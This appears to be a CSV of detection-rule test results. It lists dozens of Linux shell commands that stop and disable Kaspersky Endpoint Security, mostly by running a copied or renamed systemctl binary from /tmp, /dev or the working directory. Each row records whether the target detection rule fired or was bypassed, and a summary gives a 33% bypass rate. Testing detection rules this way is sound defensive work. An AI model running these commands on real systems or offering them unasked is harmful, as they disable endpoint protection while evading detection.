ID,Command,Log File,Result,All Detected Rules
218,cp /bin/systemctl /tmp/run; chmod +x /tmp/run; /tmp/run stop kesl && /tmp/run disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack218.log,Bypass Target Rule,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | System Information Discovery | Potentially Suspicious Execution From Tmp Folder
219,cp /usr/bin/systemctl /tmp/0xdead; /tmp/0xdead stop kesl && /tmp/0xdead disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack219.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
220,cp /bin/systemctl /tmp/🧠; /tmp/🧠 stop kesl && /tmp/🧠 disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack220.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
221,cp /bin/systemctl ./kstop; ./kstop stop kesl && ./kstop disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack221.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
222,cp $(which systemctl) /tmp/_svc; /tmp/_svc stop kesl && /tmp/_svc disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack222.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
223,"cp /bin/bash /tmp/bexec; /tmp/bexec -c ""systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack223.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities | System Information Discovery | Disable Or Stop Services | Potentially Suspicious Execution From Tmp Folder | Kaspersky Endpoint Security Stopped Via CommandLine - Linux
224,cp /usr/bin/systemctl /var/run/tmpx; /var/run/tmpx stop kesl && /var/run/tmpx disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack224.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
225,cp /bin/systemctl /tmp/$RANDOM; /tmp/$RANDOM stop kesl && /tmp/$RANDOM disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack225.log,Bypass Target Rule,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
226,cp /usr/bin/systemctl /dev/memctl; /dev/memctl stop kesl && /dev/memctl disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack226.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
227,cp /bin/systemctl ./c; ./c stop kesl && ./c disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack227.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
228,cp $(which systemctl) ./a; ./a stop kesl && ./a disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack228.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
229,cp /bin/systemctl /tmp/🛡️; /tmp/🛡️ stop kesl && /tmp/🛡️ disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack229.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
230,"cp /bin/bash /tmp/secure_exec; /tmp/secure_exec -c ""systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack230.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities | System Information Discovery | Disable Or Stop Services | Potentially Suspicious Execution From Tmp Folder | Kaspersky Endpoint Security Stopped Via CommandLine - Linux
231,cp /bin/systemctl /tmp/stopKaspersky; /tmp/stopKaspersky stop kesl && /tmp/stopKaspersky disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack231.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
232,cp /usr/bin/systemctl /var/tmp/.ks; /var/tmp/.ks stop kesl && /var/tmp/.ks disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack232.log,Bypass Target Rule,System Information Discovery | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
233,"cp /bin/bash /tmp/.bsh; /tmp/.bsh -c ""systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack233.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities | System Information Discovery | Disable Or Stop Services | Potentially Suspicious Execution From Tmp Folder | Kaspersky Endpoint Security Stopped Via CommandLine - Linux
234,cp /usr/bin/systemctl ./cmd; ./cmd stop kesl && ./cmd disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack234.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
235,cp /bin/systemctl ./🧬; ./🧬 stop kesl && ./🧬 disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack235.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
236,cp /bin/systemctl /tmp/__sys__; /tmp/__sys__ stop kesl && /tmp/__sys__ disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack236.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
237,cp /usr/bin/systemctl /tmp/xz; /tmp/xz stop kesl && /tmp/xz disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack237.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
238,cp $(which systemctl) /tmp/.xhidden; /tmp/.xhidden stop kesl && /tmp/.xhidden disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack238.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
239,cp /bin/systemctl /dev/kslstop; /dev/kslstop stop kesl && /dev/kslstop disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack239.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
240,"cp /bin/bash ./runbash; ./runbash -c ""systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack240.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
241,cp /bin/systemctl /var/tmp/sys.service; /var/tmp/sys.service stop kesl && /var/tmp/sys.service disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack241.log,Bypass Target Rule,System Information Discovery | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
242,cp /bin/systemctl ./sysctl2; ./sysctl2 stop kesl && ./sysctl2 disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack242.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
243,cp $(command -v systemctl) /tmp/altctl; /tmp/altctl stop kesl && /tmp/altctl disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack243.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
244,cp /usr/bin/systemctl ./service; ./service stop kesl && ./service disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack244.log,Bypass Target Rule,System Information Discovery | Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
245,"cp /bin/bash /tmp/kstopper; /tmp/kstopper -c ""systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack245.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities | System Information Discovery | Disable Or Stop Services | Potentially Suspicious Execution From Tmp Folder | Kaspersky Endpoint Security Stopped Via CommandLine - Linux
246,cp /bin/systemctl ./runner; ./runner stop kesl && ./runner disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack246.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
247,cp /usr/bin/systemctl ./daemonctl; ./daemonctl stop kesl && ./daemonctl disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack247.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
248,cp /bin/systemctl ./🧿; ./🧿 stop kesl && ./🧿 disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack248.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
249,cp /bin/systemctl /tmp/.x; /tmp/.x stop kesl && /tmp/.x disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack249.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
250,cp $(which systemctl) ./🪛; ./🪛 stop kesl && ./🪛 disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack250.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
251,cp /bin/systemctl /tmp/svc1; /tmp/svc1 stop kesl && /tmp/svc1 disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack251.log,Bypass Target Rule,System Information Discovery | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
252,cp /bin/systemctl ./bin1; ./bin1 stop kesl && ./bin1 disable kesl,Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack252.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
,,,,
,,,,
=== SUMMARY REPORT ===,,,,
Calculation Base (Source: Detection Results),,,,
Total Meaningful Logs (Denominator),215,,,
Triggered Target (Detections),144,,,
Bypass Logs (Numerator),71,,,
BYPASS RATE (Bypass/Meaningful),71 / 215 (33.02%),,,
